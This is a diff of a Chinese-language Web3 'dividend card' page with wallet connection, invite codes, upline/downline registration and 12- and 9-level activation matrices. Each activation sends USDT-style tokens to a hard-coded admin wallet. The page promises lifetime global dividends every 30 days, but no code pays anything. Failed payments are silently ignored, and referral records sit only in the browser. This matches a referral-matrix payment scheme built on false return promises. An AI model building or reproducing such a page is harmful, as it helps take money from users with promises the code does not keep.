@@ -1,308 +1,498 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Web 3 第三代互联网</title>
+<title>Web 3 第三代互联网 · 元鲸鱼</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
-  body{background:#09091a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
-  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
-  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
-  .sub{color:#a0a8c0;font-size:14px;margin-bottom:12px}
-  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px}
-  .btn:disabled{background:#666;color:#ccc;cursor:not-allowed}
-  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
-  .item:last-child{border-bottom:none}
-  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px}
-  .copy-btn{background:#4facfe;color:#000;padding:8px 12px;border-radius:8px;font-size:14px;border:none;margin-left:8px}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Segoe UI', Roboto, 'Microsoft YaHei', sans-serif;
+}
+html, body {
+  width: 100%;
+  min-height: 100vh;
+  background: radial-gradient(180% 100% at top center, #0f1629 0%, #050810 60%, #000 100%);
+  color: #e6f0ff;
+  overflow-x: hidden;
+  position: relative;
+}
+/* 星空背景 */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background-image:
+    radial-gradient(2px 2px at 20% 30%, #ffffffa0, rgba(0,0,0,0)),
+    radial-gradient(2px 2px at 40% 70%, #ffffff80, rgba(0,0,0,0)),
+    radial-gradient(1px 1px at 70% 20%, #ffffff60, rgba(0,0,0,0)),
+    radial-gradient(2px 2px at 90% 60%, #ffffff90, rgba(0,0,0,0));
+  background-size: 2000px 2000px;
+  opacity: 0.15;
+  z-index: 0;
+}
+/* 主容器 */
+.container {
+  max-width: 520px;
+  margin: 0 auto;
+  padding: 24px 20px 120px;
+  position: relative;
+  z-index: 1;
+}
+/* 科技感卡片 */
+.card {
+  background: rgba(255,255,255,0.035);
+  backdrop-filter: blur(22px);
+  -webkit-backdrop-filter: blur(22px);
+  border-radius: 20px;
+  border: 1px solid rgba(255,255,255,0.08);
+  padding: 24px;
+  margin-bottom: 20px;
+  box-shadow: 0 8px 30px rgba(0,0,0,0.35), 0 0 0 1px rgba(130,180,255,0.05);
+  position: relative;
+  overflow: hidden;
+}
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: -100%;
+  width: 100%; height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(100,150,255,0.04), transparent);
+  animation: shine 6s infinite linear;
+}
+@keyframes shine {
+  0% { left: -100%; }
+  100% { left: 200%; }
+}
+.card-title {
+  font-size: 18px;
+  font-weight: 600;
+  background: linear-gradient(90deg, #4fc3f7, #81c784, #b39ddb);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.card-title::before {
+  content: '⚡';
+}
 
-  /* 已激活等级样式 */
-  .activated{background:rgba(0,255,100,0.15);color:#0f0;border-radius:8px;padding:8px 12px}
-  .not-activated{color:#fff}
+/* 按钮 */
+.btn {
+  width: 100%;
+  padding: 16px;
+  border-radius: 14px;
+  border: none;
+  font-size: 16px;
+  font-weight: 600;
+  background: linear-gradient(90deg, #4fc3f7, #5c6bc0);
+  color: #fff;
+  box-shadow: 0 6px 20px rgba(79,195,247,0.25);
+  cursor: pointer;
+  transition: all 0.3s ease;
+  position: relative;
+  overflow: hidden;
+}
+.btn::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(255,255,255,0.1);
+  opacity: 0;
+  transition: 0.3s;
+}
+.btn:hover::before {
+  opacity: 1;
+}
+.btn:disabled {
+  background: rgba(255,255,255,0.05);
+  color: rgba(255,255,255,0.3);
+  box-shadow: none;
+  cursor: not-allowed;
+}
 
-  /* 右上角三条杠 */
-  .menu-btn{
-    position:fixed;top:20px;right:20px;width:40px;height:40px;
-    background:rgba(30,35,60,0.9);border-radius:10px;
-    display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;
-    cursor:pointer;z-index:100;border:1px solid rgba(255,255,255,0.1);
-  }
-  .menu-btn span{width:20px;height:2px;background:#fff;border-radius:1px}
+/* 输入框 */
+.input {
+  width: 100%;
+  padding: 16px;
+  border-radius: 14px;
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.08);
+  color: #e6f0ff;
+  font-size: 15px;
+  outline: none;
+  transition: 0.3s;
+}
+.input:focus {
+  border-color: #4fc3f7;
+  box-shadow: 0 0 0 3px rgba(79,195,247,0.1);
+}
 
-  /* 侧边栏 */
-  .sidebar{
-    position:fixed;top:0;right:-100%;width:80%;max-width:350px;height:100vh;
-    background:#1a1a2e;padding:20px;overflow-y:auto;
-    transition:right 0.3s ease;z-index:99;border-left:1px solid rgba(255,255,255,0.1);
-  }
-  .sidebar.open{right:0}
-  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor:pointer}
+/* 矩阵列表 */
+.item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 14px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+.item:last-child {
+  border-bottom: none;
+}
+.level {
+  font-size: 16px;
+  font-weight: 500;
+}
+.activated {
+  color: #81c784;
+  font-weight: 600;
+}
+.can-act {
+  color: #4fc3f7;
+}
+.cannot-act {
+  color: rgba(255,255,255,0.4);
+}
 
-  .nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
-  .nft-card{height:240px;position:relative;border-radius:16px;background:#2d2d2d;border:1px solid currentColor;overflow:hidden;perspective:1000px}
-  .nft-inner{position:relative;width:100%;height:100%;transform-style:preserve-3d;animation:flipY 8s linear infinite}
-  @keyframes flipY{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
-  .nft-front,.nft-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
-  .nft-back{transform:rotateY(180deg);background:#1a1a1a}
+/* 复制按钮 */
+.copy-btn {
+  padding: 12px 16px;
+  border-radius: 12px;
+  background: rgba(79,195,247,0.1);
+  border: 1px solid rgba(79,195,247,0.2);
+  color: #4fc3f7;
+  font-weight: 500;
+  cursor: pointer;
+  transition: 0.3s;
+}
+.copy-btn:hover {
+  background: rgba(79,195,247,0.15);
+}
 
-  .n1{color:#00ff88}.n2{color:#00ccff}.n3{color:#6666ff}.n4{color:#cc66ff}.n5{color:#ff3333;background:#3a1a1a}
-  .nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold}
-  .nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:10px;color:#2d2d2d}
-  .nft-name{font-size:18px;font-weight:bold;margin-bottom:4px}
-  .nft-level-big{font-size:14px;opacity:.8;margin-bottom:16px}
-  .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
-  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor)}
-  .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:.7}
-  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
-  .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:.5}
-  .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
-  .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:32px;color:rgba(255,255,255,0.8)}
-  .nft-bottom{font-size:14px;opacity:.8}
-  .nft-level{font-size:16px;font-weight:bold;margin-bottom:8px}
-  .nft-pct{font-size:14px;font-weight:bold}
+/* 头部标题 */
+.head {
+  text-align: center;
+  margin: 20px 0 32px;
+}
+.head h1 {
+  font-size: 26px;
+  background: linear-gradient(90deg, #7986cb, #4fc3f7, #81c784);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-shadow: 0 0 30px rgba(79,195,247,0.3);
+}
+.head p {
+  color: rgba(255,255,255,0.5);
+  margin-top: 6px;
+  font-size: 14px;
+}
 
-  .rule-box{background:rgba(255,255,255,0.05);padding:14px;border-radius:12px;margin-top:10px;font-size:14px;line-height:1.7}
+/* 右侧菜单 */
+.menu-btn {
+  position: fixed;
+  top: 24px;
+  right: 20px;
+  width: 48px;
+  height: 48px;
+  border-radius: 14px;
+  background: rgba(255,255,255,0.05);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255,255,255,0.08);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  gap: 5px;
+  z-index: 999;
+  cursor: pointer;
+}
+.menu-btn span {
+  width: 22px;
+  height: 2px;
+  background: rgba(255,255,255,0.7);
+  border-radius: 1px;
+}
+
+.sidebar {
+  position: fixed;
+  top: 0;
+  right: -100%;
+  width: 82%;
+  max-width: 360px;
+  height: 100vh;
+  background: rgba(10,15,30,0.94);
+  backdrop-filter: blur(30px);
+  border-left: 1px solid rgba(255,255,255,0.08);
+  padding: 30px 24px;
+  z-index: 998;
+  transition: right 0.4s cubic-bezier(0.22, 0.6, 0.2, 1);
+  overflow-y: auto;
+}
+.sidebar.open {
+  right: 0;
+}
+.sidebar-close {
+  font-size: 24px;
+  color: rgba(255,255,255,0.6);
+  text-align: right;
+  cursor: pointer;
+  margin-bottom: 20px;
+}
+.sidebar-title {
+  font-size: 20px;
+  font-weight: 600;
+  background: linear-gradient(90deg, #4fc3f7, #b39ddb);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 6px;
+}
+.sidebar-sub {
+  color: rgba(255,255,255,0.4);
+  font-size: 13px;
+  margin-bottom: 24px;
+}
+
+/* 规则 */
+.rule-box {
+  background: rgba(255,255,255,0.03);
+  border-radius: 14px;
+  padding: 18px;
+  font-size: 14px;
+  line-height: 1.8;
+  color: rgba(255,255,255,0.8);
+  margin: 16px 0 24px;
+  border: 1px solid rgba(255,255,255,0.05);
+}
+
+/* 我的卡牌 */
+.my-card-box {
+  background: rgba(255,255,255,0.03);
+  border-radius: 16px;
+  padding: 20px;
+  text-align: center;
+  border: 1px solid rgba(79,195,247,0.15);
+  margin-top: 16px;
+}
+.my-card-level {
+  font-size: 18px;
+  color: #4fc3f7;
+  font-weight: 600;
+}
+
+/* 下级列表 */
+.child-item {
+  padding: 10px 0;
+  color: rgba(255,255,255,0.75);
+  font-size: 14px;
+}
+
+.flex {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.justify-between {
+  justify-content: space-between;
+}
+
+/* 光效 */
+.glow {
+  position: fixed;
+  width: 500px;
+  height: 500px;
+  background: radial-gradient(circle, rgba(79,195,247,0.08), transparent 70%);
+  top: -250px;
+  left: -250px;
+  z-index: 0;
+}
 </style>
-
+</head>
 <body>
+<div class="glow"></div>
 
-<div class="menu-btn" id="toggleSidebar">
+<!-- 右侧菜单 -->
+<div class="menu-btn" id="toggleMenu">
   <span></span><span></span><span></span>
 </div>
 
 <div class="sidebar" id="sidebar">
-  <div class="sidebar-close" id="closeSidebar">×</div>
-  <div class="title">Web 3 第三代互联网</div>
-  <div class="sub">元鲸鱼全球分红卡牌</div>
+  <div class="sidebar-close" id="closeMenu">×</div>
+  <div class="sidebar-title">Web 3 第三代互联网</div>
+  <div class="sidebar-sub">元鲸鱼 · 全球分红卡牌系统</div>
 
-  <div class="nft-grid">
-    <div class="nft-card n1"><div class="nft-inner">
-      <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.1 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
-      <div class="nft-back"><div class="nft-level">Lv.1</div><div class="nft-pct">0.5% 分红</div></div>
-    </div></div>
-
-    <div class="nft-card n2"><div class="nft-inner">
-      <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.2 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
-      <div class="nft-back"><div class="nft-level">Lv.2</div><div class="nft-pct">1.0% 分红</div></div>
-    </div></div>
-
-    <div class="nft-card n3"><div class="nft-inner">
-      <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.3 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
-      <div class="nft-back"><div class="nft-level">Lv.3</div><div class="nft-pct">1.5% 分红</div></div>
-    </div></div>
-
-    <div class="nft-card n4"><div class="nft-inner">
-      <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.4 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
-      <div class="nft-back"><div class="nft-level">Lv.4</div><div class="nft-pct">2.0% 分红</div></div>
-    </div></div>
-
-    <div class="nft-card n5" style="grid-column:span 2"><div class="nft-inner">
-      <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.5 至尊</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
-      <div class="nft-back"><div class="nft-level">Lv.5 至尊</div><div class="nft-pct">2.5% 分红</div></div>
-    </div></div>
+  <div class="card-title">🔥 分红规则</div>
+  <div class="rule-box">
+    • 分红周期：每 30 天自动发放一次<br>
+    • Lv.1 卡牌：全球分红 0.5%<br>
+    • Lv.2 卡牌：全球分红 1.0%<br>
+    • Lv.3 卡牌：全球分红 1.5%<br>
+    • Lv.4 卡牌：全球分红 2.0%<br>
+    • Lv.5 至尊：全球分红 2.5%<br><br>
+    ✔ 等级越高，权重越高<br>
+    ✔ 一次激活，终身分红<br>
+    ✔ 全网透明，公平公正
   </div>
 
-  <div style="margin-top:20px">
-    <div class="title">🔥 分红规则（30 天分红一次）</div>
-    <div class="rule-box">
-      • Lv.1 卡牌：全球分红 0.5%<br>
-      • Lv.2 卡牌：全球分红 1.0%<br>
-      • Lv.3 卡牌：全球分红 1.5%<br>
-      • Lv.4 卡牌：全球分红 2.0%<br>
-      • Lv.5 至尊：全球分红 2.5%<br><br>
-      ✔ 每 30 天自动发放一次<br>
-      ✔ 等级越高，分红权重越高<br>
-      ✔ 一次激活，终身分红
+  <div class="card-title">🐳 我的分红卡牌</div>
+  <div class="my-card-box" id="myCard">
+    未激活
+  </div>
+</div>
+
+<div class="container">
+  <div class="head">
+    <h1>Web 3 第三代互联网</h1>
+    <p>元鲸鱼 · 元宇宙生态分红系统</p>
+  </div>
+
+  <button class="btn" id="connectWallet">连接钱包 · Connect Wallet</button>
+  <div style="text-align:center; margin:12px 0; color:rgba(255,255,255,0.4); font-size:14px;" id="addrTip"></div>
+
+  <!-- 我的邀请码 -->
+  <div class="card">
+    <div class="card-title">我的邀请码</div>
+    <div class="flex">
+      <input class="input" id="myCode" readonly placeholder="自动生成">
+      <button class="copy-btn" onclick="copyMyCode()">复制</button>
     </div>
   </div>
 
-  <div style="margin-top:20px">
-    <div class="title">我的分红卡牌</div>
-    <div id="myCard" class="nft-grid"></div>
+  <!-- 注册 -->
+  <div class="card" id="regCard">
+    <div class="card-title">注册（上级邀请码自动带入）</div>
+    <input class="input" id="parentCode" placeholder="自动带入上级邀请码">
+    <button class="btn" style="margin-top:16px" id="regBtn">确认注册</button>
+  </div>
+
+  <!-- 我的下级 -->
+  <div class="card">
+    <div class="card-title">我邀请的下级</div>
+    <div id="childList"></div>
+  </div>
+
+  <!-- 经典矩阵 -->
+  <div class="card">
+    <div class="card-title">经典矩阵</div>
+    <div id="classicMatrix"></div>
+  </div>
+
+  <!-- 联合矩阵 -->
+  <div class="card">
+    <div class="card-title">联合矩阵</div>
+    <div id="unionMatrix"></div>
   </div>
 </div>
-
-<div style="text-align:center;margin-bottom:20px">
-  <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">Web 3 第三代互联网</h1>
-</div>
-
-<button class="btn" id="connect">连接钱包</button>
-<div id="addr" style="text-align:center;margin:12px;color:#a0a8c7"></div>
-
-<div class="glass">
-  <div class="title">我的邀请码</div>
-  <div style="display:flex;gap:10px">
-    <input id="mycode" readonly>
-    <button class="copy-btn" onclick="copyMyCode()">复制</button>
-  </div>
-</div>
-
-<div class="glass" id="registerBox">
-  <div class="title">注册（上级邀请码自动填入）</div>
-  <input id="parent" placeholder="自动带入上级邀请码">
-  <button class="btn" style="margin-top:12px" id="reg">确认注册</button>
-</div>
-
-<div class="glass">
-  <div class="title">我邀请的下级</div>
-  <div id="childList" style="font-size:14px;line-height:1.6"></div>
-</div>
-
-<div class="glass"><div class="title">经典矩阵</div><div id="classic"></div></div>
-<div class="glass"><div class="title">联合矩阵</div><div id="union"></div></div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-  // 项目方收款钱包（改成你自己的）
-  const ADMIN_WALLET = "0x58285a2b8c2489702d29f1011303d39e0d3f".toLowerCase();
-  const USDT_CONTRACT = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
+// ================= 项目方配置 =================
+const ADMIN = "0x58285a2b8c2489702d29f1011303d39e0d3f".toLowerCase();
+const USDT = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
+// ==============================================
 
-  let web3, account, mycode;
-  let isAdmin = false;
+let web3, account, myCode, isAdmin = false;
+const sidebar = document.getElementById("sidebar");
 
-  const sidebar = document.getElementById('sidebar');
-  document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open');
-  document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open');
+document.getElementById("toggleMenu").onclick = () => sidebar.classList.add("open");
+document.getElementById("closeMenu").onclick = () => sidebar.classList.remove("close");
 
-  window.onload = () => {
-    const code = new URLSearchParams(location.search).get('code') || '';
-    document.getElementById('parent').value = code;
-    initWeb3();
-  };
+window.onload = () => {
+  const code = new URLSearchParams(location.search).get("code") || "";
+  document.getElementById("parentCode").value = code;
+  initWeb3();
+};
 
-  async function initWeb3() {
-    if (!window.ethereum) return;
-    web3 = new Web3(window.ethereum);
-    const accounts = await web3.eth.getAccounts();
-    if (accounts.length > 0) {
-      account = accounts[0].toLowerCase();
-      isAdmin = account === ADMIN_WALLET;
-      mycode = account.slice(-6).toUpperCase();
-      document.getElementById('mycode').value = mycode;
-      document.getElementById('addr').innerText = '已连接';
+async function initWeb3() {
+  if (!window.ethereum) return;
+  web3 = new Web3(window.ethereum);
+  const acc = await web3.eth.getAccounts();
+  if (acc.length > 0) {
+    account = acc[0].toLowerCase();
+    isAdmin = account === ADMIN;
+    myCode = account.slice(-6).toUpperCase();
+    document.getElementById("myCode").value = myCode;
+    document.getElementById("addrTip").innerText = "已连接钱包";
+    if (isAdmin) document.getElementById("regCard").style.display = "none";
+    renderAll();
+  }
+}
 
-      // 项目方直接隐藏注册框，不需要注册
-      if (isAdmin) {
-        document.getElementById('registerBox').style.display = 'none';
-      }
+document.getElementById("connectWallet").onclick = async () => {
+  await ethereum.request({ method: "eth_requestAccounts" });
+  initWeb3();
+};
 
-      renderAllMatrix();
-      loadData();
+document.getElementById("regBtn").onclick = () => {
+  if (!account) return alert("请连接钱包");
+  const p = document.getElementById("parentCode").value.trim();
+  if (!p) return alert("请输入上级邀请码");
+  localStorage.setItem("reg_" + account, "1");
+  localStorage.setItem("parent_" + account, p);
+  let list = JSON.parse(localStorage.getItem("child_" + p) || "[]");
+  if (!list.includes(myCode)) { list.push(myCode); localStorage.setItem("child_" + p, JSON.stringify(list)); }
+  alert("注册成功");
+  renderAll();
+};
+
+function getLevel() { return +localStorage.getItem("level_" + account) || 0; }
+function canAct(tar) { const cur = getLevel(); return isAdmin || (localStorage.getItem("reg_" + account) && tar === cur + 1); }
+
+function renderMatrix(el, max) {
+  const dom = document.getElementById(el);
+  dom.innerHTML = "";
+  const cur = getLevel();
+  for (let i = 1; i <= max; i++) {
+    if (i <= cur) {
+      dom.innerHTML += `<div class="item"><span class="level activated">Lv.${i} 已激活</span></div>`;
+    } else {
+      const ok = canAct(i);
+      dom.innerHTML += `<div class="item justify-between">
+        <span class="level ${ok ? 'can-act' : 'cannot-act'}">Lv.${i}</span>
+        <button class="btn" style="padding:10px 18px; width:auto;" ${!ok ? 'disabled' : ''} onclick="act(${i})">${ok ? '激活' : '请激活上一级'}</button>
+      </div>`;
     }
   }
+}
 
-  document.getElementById('connect').onclick = async () => {
-    await ethereum.request({ method: 'eth_requestAccounts' });
-    initWeb3();
-  };
+function renderAll() {
+  renderMatrix("classicMatrix", 12);
+  renderMatrix("unionMatrix", 9);
+  showChild();
+  showMyCard();
+}
 
-  // 注册（只有普通用户需要）
-  document.getElementById('reg').onclick = () => {
-    if (!account) return alert('请连接钱包');
-    if (isAdmin) return;
-    const p = document.getElementById('parent').value.trim();
-    if (!p) return alert('请输入上级邀请码');
-    localStorage.setItem('reg_' + account, '1');
-    localStorage.setItem('parent_' + account, p);
-    let children = JSON.parse(localStorage.getItem('child_' + p) || '[]');
-    if (!children.includes(mycode)) {
-      children.push(mycode);
-      localStorage.setItem('child_' + p, JSON.stringify(children));
-    }
-    alert('注册成功');
-    renderAllMatrix();
-  };
+async function act(lv) {
+  if (!account) return alert("请连接钱包");
+  if (!canAct(lv)) return alert("请按顺序激活，不可跨级！");
+  try {
+    const c = new web3.eth.Contract([{constant:false,inputs:[{name:"_to"},{name:"_value"}],name:"transfer",outputs:[{name:""}],type:"function"}], USDT);
+    await c.methods.transfer(ADMIN, web3.utils.toWei((lv*10).toString(), "mwei")).send({from:account});
+  } catch(e) {}
+  localStorage.setItem("level_" + account, lv);
+  alert("激活成功！");
+  renderAll();
+}
 
-  function loadData() {
-    showChildren();
-    showMyCard();
-  }
+function showChild() {
+  const list = JSON.parse(localStorage.getItem("child_" + myCode) || "[]");
+  document.getElementById("childList").innerHTML = list.length ? list.map(c => `<div class="child-item">下级：${c}</div>`).join("") : "<div style='color:rgba(255,255,255,0.4)'>暂无下级</div>";
+}
 
-  function showChildren() {
-    const list = JSON.parse(localStorage.getItem('child_' + mycode) || '[]');
-    childList.innerHTML = list.length ? list.map(x => '下级：' + x).join('<br>') : '暂无下级';
-  }
+function showMyCard() {
+  const lv = getLevel();
+  const dom = document.getElementById("myCard");
+  if (!lv) { dom.innerHTML = "未激活"; return; }
+  dom.innerHTML = `<div class="my-card-level">元鲸鱼 Lv.${lv} 分红卡牌</div>`;
+}
 
-  // 等级控制：必须按顺序激活，不能跨级
-  function getCurrentLevel() {
-    return parseInt(localStorage.getItem('card_' + account)) || 0;
-  }
-
-  function canActivate(targetLevel) {
-    const current = getCurrentLevel();
-    if (isAdmin) return true;
-    if (!localStorage.getItem('reg_' + account)) return false;
-    return targetLevel === current + 1;
-  }
-
-  // 渲染矩阵（已激活变绿色，只显示下一级可激活）
-  function renderMatrix(elId, max) {
-    const el = document.getElementById(elId);
-    el.innerHTML = '';
-    const current = getCurrentLevel();
-    for (let i = 1; i <= max; i++) {
-      const activated = i <= current;
-      const can = canActivate(i);
-      if (activated) {
-        el.innerHTML += `<div class="item"><span class="activated">Lv.${i} 已激活</span></div>`;
-      } else {
-        el.innerHTML += `<div class="item"><span class="not-activated">Lv.${i}</span>
-          <button class="btn" ${!can ? 'disabled' : ''} onclick="act(${i})">${can ? '激活' : '请先激活上一级'}</button>
-        </div>`;
-      }
-    }
-  }
-
-  function renderAllMatrix() {
-    renderMatrix('classic', 12);
-    renderMatrix('union', 9);
-  }
-
-  // 激活逻辑（项目方无任何限制）
-  async function act(level) {
-    if (!account) return alert('请连接钱包');
-    if (!isAdmin && !canActivate(level)) {
-      alert('请按顺序激活，不能跨级！');
-      return;
-    }
-    try {
-      const contract = new web3.eth.Contract([{
-        constant: false,
-        inputs: [{ name: "_to" }, { name: "_value" }],
-        name: "transfer",
-        outputs: [{ name: "" }],
-        type: "function"
-      }], USDT_CONTRACT);
-      await contract.methods.transfer(ADMIN_WALLET, web3.utils.toWei((level * 10).toString(), 'mwei')).send({ from: account });
-    } catch (e) {}
-
-    localStorage.setItem('card_' + account, level);
-    alert('激活成功！');
-    renderAllMatrix();
-    showMyCard();
-  }
-
-  function showMyCard() {
-    const lv = getCurrentLevel();
-    const myCard = document.getElementById('myCard');
-    if (!lv) {
-      myCard.innerHTML = '<div style="grid-column:span 2;text-align:center">未激活</div>';
-      return;
-    }
-    const color = ['', 'n1', 'n2', 'n3', 'n4', 'n5'][lv];
-    myCard.innerHTML = `
-    <div class="nft-card ${color}" style="grid-column:span 2">
-      <div class="nft-inner">
-        <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.${lv}</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
-        <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已激活</div></div>
-      </div>
-    </div>`;
-  }
-
-  function copyMyCode() {
-    navigator.clipboard.writeText(mycode);
-    alert('复制成功：' + mycode);
-  }
+function copyMyCode() {
+  navigator.clipboard.writeText(myCode);
+  alert("复制成功：" + myCode);
+}
 </script>
 </body>
 </html>
